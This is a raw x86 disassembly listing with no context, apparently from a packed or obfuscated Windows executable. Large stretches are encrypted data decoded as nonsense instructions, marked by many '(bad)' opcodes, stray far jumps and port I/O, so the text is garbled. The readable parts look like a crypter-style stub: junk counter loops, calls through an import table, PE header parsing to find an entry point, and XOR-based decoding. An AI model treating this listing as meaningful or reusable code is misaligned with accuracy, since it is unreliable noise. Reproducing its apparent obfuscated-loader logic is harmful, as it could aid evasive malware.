  4060d2:	hlt    
  4060d3:	mov    dl,ch
  4060d5:	loopne 0x406105
  4060d7:	lea    esi,[esi-0x653dee0f]
  4060dd:	mov    ebx,0xaf55758
  4060e2:	sbb    al,dl
  4060e4:	adc    al,0x64
  4060e6:	lds    eax,FWORD PTR [ecx-0x31]
  4060e9:	lea    edx,[eax]
  4060eb:	mov    ds:0x5f7aa052,al
  4060f0:	stc    
  4060f1:	adc    eax,0xa18aaf04
  4060f6:	and    al,0x3
  4060f8:	add    eax,edi
  4060fa:	fmul   st(7),st
  4060fc:	jnp    0x4060d1
  4060fe:	add    ecx,DWORD PTR [ecx]
  406100:	cs xchg edx,eax
  406102:	push   ebp
  406103:	cwde   
  406104:	sbb    al,0xe6
  406106:	hlt    
  406107:	adc    DWORD PTR [eax-0x5d],esi
  40610a:	xchg   edi,eax
  40610b:	outs   dx,DWORD PTR ds:[esi]
  40610c:	dec    eax
  40610d:	les    esp,FWORD PTR [eax+0x9]
  406110:	sbb    BYTE PTR [ecx-0x269a404b],bl
  406116:	push   edx
  406117:	mov    edi,0x6dfbfe8a
  40611c:	dec    esp
  40611d:	mov    al,ds:0xfaf5cc94
  406122:	lods   al,BYTE PTR ds:[esi]
  406123:	mov    ebp,0x9f3f8608
  406128:	xchg   ebx,eax
  406129:	das    
  40612a:	push   ss
  40612b:	popf   
  40612c:	out    0x49,al
  40612e:	rol    BYTE PTR [edx+edx*1-0x6f091ecf],0x7d
  406136:	in     eax,0xf8
  406138:	mov    al,ds:0xba840c54
  40613d:	fnstsw WORD PTR [eax]
  40613f:	out    dx,al
  406140:	adc    DWORD PTR [ebx-0x69d1addf],ebp
  406146:	cmp    BYTE PTR [edi],dh
  406148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406149:	addr16 and eax,0x7cc52896
  40614f:	aam    0x37
  406151:	dec    ecx
  406152:	lds    ecx,FWORD PTR [ebx-0x26e820f5]
  406158:	adc    dh,BYTE PTR [edi+0x4b]
  40615b:	adc    cl,BYTE PTR [esi+ebx*1+0x74]
  40615f:	fst    QWORD PTR [edx+0x24]
  406162:	out    0xe,al
  406164:	lock adc al,0x23
  406167:	and    DWORD PTR [edx+0x1c],eax
  40616a:	mov    eax,ds:0xa523bb0e
  40616f:	in     eax,dx
  406170:	push   cs
  406171:	scas   eax,DWORD PTR es:[edi]
  406172:	sbb    bh,BYTE PTR [eax]
  406174:	add    DWORD PTR [eax-0x1a],0x25
  406178:	xor    dh,BYTE PTR gs:[edi+0x630a9149]
  40617f:	fcom   QWORD PTR [esi-0x76ae074e]
  406185:	xchg   ecx,eax
  406187:	stos   BYTE PTR es:[edi],al
  406188:	ss cwde 
  40618a:	shl    bl,cl
  40618c:	xchg   BYTE PTR [esp+ebx*4],bh
  40618f:	jns    0x4061ba
  406191:	xor    al,0x3f
  406193:	push   0x5976097c
  406198:	(bad)  
  406199:	in     al,0x25
  40619b:	and    eax,ebp
  40619d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40619e:	fs cmp al,0xf2
  4061a1:	cwde   
  4061a2:	add    al,0x13
  4061a4:	xchg   ebx,eax
  4061a5:	loop   0x406135
  4061a7:	inc    edx
  4061a8:	jo     0x406207
  4061aa:	cmp    BYTE PTR [ecx+0x1],bh
  4061ad:	dec    ecx
  4061ae:	(bad)  
  4061af:	jmp    0x4061b9
  4061b1:	popf   
  4061b2:	mov    eax,0x1f38571c
  4061b7:	jmp    0x549e:0xfff8a73b
  4061be:	push   DWORD PTR [edx-0x19]
  4061c1:	std    
  4061c2:	inc    eax
  4061c3:	xchg   edi,eax
  4061c4:	or     al,0x3
  4061c6:	call   0x34e873e2
  4061cb:	inc    ecx
  4061cc:	push   ecx
  4061cd:	sub    DWORD PTR [ecx],0x63eedb20
  4061d3:	sahf   
  4061d4:	jno    0x4061ad
  4061d6:	das    
  4061d7:	adc    BYTE PTR [ebp+edi*8+0x5a07fefb],dl
  4061de:	sbb    BYTE PTR [edi-0x682e18f2],dl
  4061e4:	lahf   
  4061e5:	xor    BYTE PTR cs:[edi-0x44],dh
  4061e9:	int3   
  4061ea:	cmp    al,0x7b
  4061ec:	add    al,BYTE PTR [esi]
  4061ee:	pusha  
  4061ef:	push   edx
  4061f0:	xchg   esp,eax
  4061f1:	out    dx,al
  4061f2:	add    al,0x99
  4061f4:	mov    ecx,0xe8afefde
  4061f9:	mov    ah,0x6c
  4061fb:	and    al,dh
  4061fd:	scas   al,BYTE PTR es:[edi]
  4061fe:	adc    bh,BYTE PTR [esi-0x2f3ea6cf]
  406204:	ds cmp dh,bh
  406207:	cmp    BYTE PTR [ecx+0x56de47e8],ch
  40620d:	dec    esi
  40620e:	push   esi
  40620f:	add    al,0x7b
  406211:	inc    esp
  406212:	and    cl,ah
  406214:	inc    ebx
  406215:	out    dx,eax
  406216:	imul   ebx,DWORD PTR [esi],0x35
  406219:	int3   
  40621a:	sub    DWORD PTR [edi+0x4a],0xfffffffd
  40621e:	xchg   ecx,eax
  40621f:	sub    ebp,eax
  406221:	inc    ebp
  406222:	shr    BYTE PTR [ebp+0x2b],0xbb
  406226:	(bad)  
  406227:	push   ecx
  406228:	xlat   BYTE PTR ds:[ebx]
  406229:	(bad)  
  40622a:	gs jbe 0x406259
  40622d:	inc    BYTE PTR [ebx]
  40622f:	adc    al,0x15
  406231:	pop    edx
  406232:	mov    ebp,0x82ada47b
  406237:	lahf   
  406238:	and    DWORD PTR [ecx-0x80],0xffffffd6
  40623c:	push   esi
  40623d:	cmp    dl,BYTE PTR [ecx+0x56]
  406240:	hlt    
  406241:	cmp    DWORD PTR [esi],0xffffffd5
  406244:	ret    
  406245:	mov    ds:0x938ff2e8,eax
  40624a:	iret   
  40624b:	sub    DWORD PTR [esi-0x11849b2],ebx
  406251:	mov    bh,0xe3
  406253:	xlat   BYTE PTR ds:[ebx]
  406254:	inc    bl
  406256:	test   DWORD PTR cs:[ebp-0x77],ebx
  40625a:	inc    ebp
  40625b:	jns    0x406281
  40625d:	inc    eax
  40625e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40625f:	xlat   BYTE PTR ds:[ebx]
  406260:	jmp    0x81f0:0x332f9cb1
  406267:	and    eax,0x433723
  40626c:	add    BYTE PTR [eax],al
  40626e:	add    BYTE PTR [eax],al
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	(bad)  
  406313:	(bad)  
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	inc    ebx
  40631e:	popa   
  40631f:	pop    ebp
  406320:	add    ecx,DWORD PTR [bx-0xd]
  406324:	sahf   
  406325:	adc    esi,DWORD PTR [esi-0x1b43ef06]
  40632b:	xchg   ebp,eax
  40632c:	aad    0x19
  40632e:	ffree  st(4)
  406330:	mov    edx,0xa46fc956
  406335:	xchg   edx,eax
  406336:	jmp    0x220b:0x6984d88d
  40633d:	shl    dh,0x2c
  406340:	sub    eax,0x415780c1
  406345:	call   0xa3b0:0x5d5e5177
  40634c:	jb     0x4063ac
  40634e:	push   es
  40634f:	jmp    0x406306
  406351:	leavew 
  406353:	mov    ah,ch
  406355:	jg     0x406316
  406357:	push   edi
  406358:	jp     0x40632e
  40635a:	jecxz  0x4062e5
  40635c:	xchg   ebx,eax
  40635d:	push   esp
  40635e:	adc    al,0x89
  406360:	lods   eax,DWORD PTR ds:[esi]
  406361:	cld    
  406362:	add    eax,0xffee322
  406367:	(bad)  [edx+0x5d]
  40636a:	sbb    esi,DWORD PTR [esi+0x3dc2bbbb]
  406370:	aad    0x73
  406372:	inc    esi
  406373:	fild   WORD PTR [edi+eax*2+0x44]
  406377:	leave  
  406378:	push   ebp
  406379:	and    eax,0xec51a369
  40637e:	jno    0x40632f
  406380:	xlat   BYTE PTR ds:[ebx]
  406381:	and    BYTE PTR [edi],ch
  406383:	cmc    
  406384:	mov    BYTE PTR [edx],al
  406386:	push   0xfffffff6
  406388:	pop    ecx
  406389:	cmp    al,BYTE PTR [ebx]
  40638b:	mov    ch,0x5f
  40638d:	xchg   DWORD PTR [ecx],ebx
  40638f:	aam    0xc
  406391:	into   
  406392:	int3   
  406393:	xchg   ebp,eax
  406394:	hlt    
  406395:	push   cs
  406396:	aam    0xb0
  406398:	or     cl,BYTE PTR [eax-0x2d]
  40639b:	inc    eax
  40639c:	clc    
  40639d:	inc    ecx
  40639e:	fcomp  DWORD PTR [edi+0x77509361]
  4063a4:	pop    ebx
  4063a5:	sub    al,0x59
  4063a7:	mov    bl,0xa6
  4063a9:	loope  0x4063b1
  4063ab:	loope  0x406410
  4063ad:	(bad)  
  4063ae:	stos   BYTE PTR es:[edi],al
  4063af:	ret    0xc8c7
  4063b2:	mov    ds:0x34666415,al
  4063b7:	xchg   ebx,eax
  4063b8:	cmp    esi,DWORD PTR [ebp+eax*2+0x76f3b1fc]
  4063bf:	and    bh,ah
  4063c1:	lea    eax,[edi]
  4063c3:	or     BYTE PTR [eax-0x49],dh
  4063c6:	(bad)  
  4063c7:	cmp    al,0x9d
  4063c9:	xor    dl,BYTE PTR [ebx]
  4063cb:	xor    BYTE PTR [edi],ch
  4063cd:	lds    ebp,FWORD PTR [ebx+0x7a3d925]
  4063d3:	jns    0x40636f
  4063d5:	xchg   BYTE PTR [eax+0x2195affc],dl
  4063db:	stos   DWORD PTR es:[edi],eax
  4063dc:	shl    BYTE PTR [ebx+ebp*1],cl
  4063df:	cmp    bh,BYTE PTR [ecx+0x40]
  4063e2:	mov    ch,0x3a
  4063e4:	lock mov eax,ds:0xd8214805
  4063ea:	lods   al,BYTE PTR ds:[esi]
  4063eb:	das    
  4063ec:	cmp    eax,0xd06c8ae1
  4063f1:	out    dx,al
  4063f2:	xchg   esp,eax
  4063f3:	rol    ch,0xf3
  4063f6:	push   ds
  4063f7:	mov    edx,0x95c32d
  4063fc:	imul   ecx,DWORD PTR [edx],0xffffffc0
  4063ff:	or     al,0x56
  406401:	dec    ecx
  406402:	and    DWORD PTR [eax+0x28],eax
  406405:	(bad)  
  406406:	sti    
  406407:	or     DWORD PTR [esi+0x48],edx
  40640a:	imul   esp,DWORD PTR [eax],0xffffffcb
  40640d:	sub    ch,BYTE PTR [ebx+0x29]
  406410:	fnstsw WORD PTR [ecx]
  406412:	dec    DWORD PTR [bx+0x58]
  406416:	shr    dh,1
  406418:	pop    eax
  406419:	mov    eax,ds:0x51a8754
  40641e:	call   0xe3b5:0xa7846c2a
  406425:	pop    esi
  406426:	mov    dl,0xa0
  406428:	pop    ebp
  40642a:	inc    ecx
  40642b:	pop    edi
  40642c:	(bad)
  406430:	sub    BYTE PTR [ecx+0x2f9a9c78],bl
  406436:	jecxz  0x4063c5
  406438:	(bad)  
  406439:	dec    esp
  40643a:	mov    edx,0xb866ec8e
  40643f:	xchg   esi,eax
  406440:	cwde   
  406441:	inc    esp
  406442:	cmc    
  406443:	jecxz  0x4064bb
  406445:	adc    DWORD PTR [ebx],0x7aa63215
  40644b:	sbb    eax,0xcca7c8a0
  406450:	inc    esp
  406451:	sub    BYTE PTR [edi-0x49c965c8],bh
  406457:	xor    ebx,DWORD PTR [ebp+0x6d370780]
  40645d:	out    0x65,eax
  40645f:	fstp   DWORD PTR [eax]
  406461:	xor    DWORD PTR [ebp-0x391b4dcf],ecx
  406467:	jo     0x40642d
  406469:	stc    
  40646a:	popa   
  40646b:	imul   eax,DWORD PTR [ebp+0x762b1e0],0xd764d167
  406475:	adc    edx,DWORD PTR [edx+ebp*8]
  406478:	std    
  406479:	mov    DWORD PTR [edi-0x20],ecx
  40647c:	in     al,dx
  40647d:	jmp    0xdfb4039c
  406482:	push   edx
  406483:	call   0x681f:0xff088c99
  40648a:	cmc    
  40648b:	mov    edx,0xd58dc354
  406490:	fimul  DWORD PTR ds:0x32a05a8
  406496:	mov    ds:0x7222ec52,eax
  40649b:	push   ebx
  40649c:	sub    DWORD PTR [esi],ebx
  40649e:	push   ebx
  40649f:	inc    ebx
  4064a0:	nop
  4064a1:	xchg   edi,eax
  4064a2:	loop   0x406479
  4064a4:	cwde   
  4064a5:	out    0xeb,eax
  4064a7:	or     DWORD PTR [ebx+0x5b],edi
  4064aa:	ret    
  4064ab:	daa    
  4064ac:	lahf   
  4064ad:	jmp    0x40650c
  4064af:	in     eax,0xf9
  4064b1:	das    
  4064b2:	js     0x406507
  4064b4:	sbb    bh,BYTE PTR [esi+0x323d471e]
  4064ba:	pop    es
  4064bb:	ret    0x57db
  4064be:	or     eax,0x407e4ea7
  4064c3:	pop    ebx
  4064c4:	lock mov eax,0x3ad5ad9b
  4064ca:	shr    DWORD PTR [edx+ebx*8-0x498e7646],1
  4064d1:	test   BYTE PTR [ebx-0x7dfa80cc],ah
  4064d7:	icebp  
  4064d8:	data16 mov WORD PTR [edi+0x9d3f742],?
  4064df:	xchg   ecx,eax
  4064e0:	(bad)  
  4064e1:	xchg   edx,eax
  4064e2:	test   eax,0x91ff102a
  4064e7:	push   edx
  4064e8:	shl    BYTE PTR [edx-0x14],cl
  4064eb:	pop    ss
  4064ec:	adc    edi,edi
  4064ee:	retfw  
  4064f0:	leave  
  4064f1:	xlat   BYTE PTR ds:[ebx]
  4064f2:	cmp    edi,DWORD PTR [ebx]
  4064f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064f5:	jmp    0xb295:0x6021830
  4064fc:	cmp    edx,DWORD PTR [edx]
  4064fe:	(bad)  
  4064ff:	push   esp
  406500:	fcomi  st,st(7)
  406502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406503:	(bad)  
  406504:	test   DWORD PTR [eax],0x3d26136f
  40650a:	and    BYTE PTR [eax+0x67],al
  40650d:	cmp    al,0xbf
  40650f:	cmp    dh,ah
  406511:	cli    
  406512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406513:	es (bad) 
  406516:	sti    
  406517:	jmp    0xad7f8092
  40651c:	cld    
  40651d:	mov    edx,0x30f7a54f
  406522:	or     eax,0xd59667c6
  406527:	cdq    
  406528:	inc    edi
  406529:	inc    esp
  40652a:	or     DWORD PTR [ebx+eax*4],edx
  40652d:	or     al,0xc1
  40652f:	rol    edi,1
  406531:	mov    al,ds:0x111b63f7
  406536:	jmp    0x3fab4b59
  40653b:	sub    esp,ebp
  40653d:	jge    0x406572
  40653f:	xchg   ebp,eax
  406540:	sub    DWORD PTR [ebx-0x3c],0x233d416c
  406547:	xor    cl,bh
  406549:	mov    bl,0x29
  40654b:	xchg   BYTE PTR ds:[ebp-0x78],cl
  40654f:	or     DWORD PTR [edi],ebp
  406551:	jae    0x406535
  406553:	jne    0x4064d6
  406555:	(bad)  
  406556:	jl     0x4065ac
  406558:	xor    BYTE PTR [eax],ah
  40655a:	ins    BYTE PTR es:[edi],dx
  40655b:	dec    ebp
  40655c:	js     0x4065d4
  40655e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  406560:	in     al,dx
  406561:	mov    cl,bl
  406563:	fldcw  WORD PTR [eax+0x14a531f4]
  406569:	out    dx,al
  40656a:	in     eax,dx
  40656b:	jle    0x4065be
  40656d:	xchg   DWORD PTR [ebp+eiz*4+0x7c1b2192],esp
  406574:	pop    esp
  406575:	lods   al,BYTE PTR ds:[esi]
  406576:	test   DWORD PTR [ebx+0x2734c249],ebx
  40657c:	ss popa 
  40657e:	sub    BYTE PTR [edi],bl
  406580:	push   eax
  406581:	outs   dx,DWORD PTR ds:[esi]
  406582:	pop    ds
  406583:	sbb    DWORD PTR [ebp-0x7],ebp
  406586:	mov    ebx,0x8b9232c0
  40658b:	sbb    BYTE PTR [ecx-0x45],0xc0
  40658f:	popa   
  406590:	cmp    edi,eax
  406592:	and    BYTE PTR [esp+ebp*2],al
  406595:	jae    0x4065e4
  406597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406598:	mov    edi,DWORD PTR [ebx-0x43cc9466]
  40659e:	(bad)  [edx-0x72218169]
  4065a4:	into   
  4065a5:	and    al,0x5b
  4065a7:	push   ss
  4065a8:	pop    ebp
  4065a9:	dec    edi
  4065aa:	in     al,dx
  4065ab:	push   es
  4065ac:	jae    0x406594
  4065ae:	dec    eax
  4065af:	push   esi
  4065b0:	push   edx
  4065b1:	mov    BYTE PTR [ecx-0x76],al
  4065b4:	dec    DWORD PTR [edi+0x6c]
  4065b7:	ror    BYTE PTR [edi+0x2f],0x15
  4065bb:	inc    ebx
  4065bc:	mov    ch,0x11
  4065be:	popa   
  4065bf:	fcomp  DWORD PTR [ebp+0x65ce7f3f]
  4065c5:	and    bh,BYTE PTR [esi-0x4b237e30]
  4065cb:	fcom   QWORD PTR [ebp-0x76]
  4065ce:	mov    ds:0x92365788,al
  4065d3:	mov    ebx,ebx
  4065d5:	cmp    eax,0x472f2ac2
  4065da:	push   esi
  4065db:	out    dx,eax
  4065dc:	std    
  4065dd:	in     eax,dx
  4065de:	in     al,dx
  4065df:	mov    al,0xe6
  4065e1:	mov    dh,0xef
  4065e3:	out    0x91,eax
  4065e5:	call   0x2fe915d7
  4065ea:	not    BYTE PTR [edx-0x1a202776]
  4065f0:	ss push ecx
  4065f2:	clc    
  4065f3:	jecxz  0x4065c4
  4065f5:	loopne 0x406633
  4065f7:	adc    BYTE PTR [ecx-0x20ea008a],cl
  4065fd:	sub    DWORD PTR [edi],esi
  4065ff:	push   edx
  406600:	and    bl,bl
  406602:	arpl   WORD PTR [eax],bx
  406604:	jmp    0xc5e180bc
  406609:	adc    DWORD PTR [ecx-0x41],edx
  40660c:	pusha  
  40660d:	(bad)  
  40660e:	sub    edx,DWORD PTR [esi]
  406610:	sub    BYTE PTR ds:0x4330041a,dh
  406616:	cdq    
  406617:	mov    dh,0x5c
  406619:	je     0x406619
  40661b:	stos   BYTE PTR es:[edi],al
  40661c:	sub    bh,BYTE PTR [edi-0x4c42830e]
  406622:	add    al,0xb9
  406624:	(bad)  
  406625:	aad    0xb9
  406627:	frstpm(287 only) 
  406629:	int    0xb9
  40662b:	addr16 push edx
  40662d:	(bad)  [esi+0x3fac2973]
  406633:	cmp    cl,BYTE PTR [ebx]
  406635:	hlt    
  406636:	rcl    DWORD PTR [edi+ebx*4+0x5f],cl
  40663a:	add    al,0xd9
  40663c:	cmp    BYTE PTR [eax-0x5b5b6dd0],bl
  406642:	outs   dx,DWORD PTR ds:[esi]
  406643:	ds stos DWORD PTR es:[edi],eax
  406645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406646:	sbb    al,0x37
  406648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406649:	pop    ebp
  40664a:	xchg   edx,eax
  40664b:	les    ecx,FWORD PTR [edx]
  40664d:	fwait
  40664e:	and    eax,0x3e9d0ff
  406653:	add    BYTE PTR [eax],al
  406655:	add    BYTE PTR [ebx-0x3d36efbb],cl
  40665b:	or     al,0x0
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
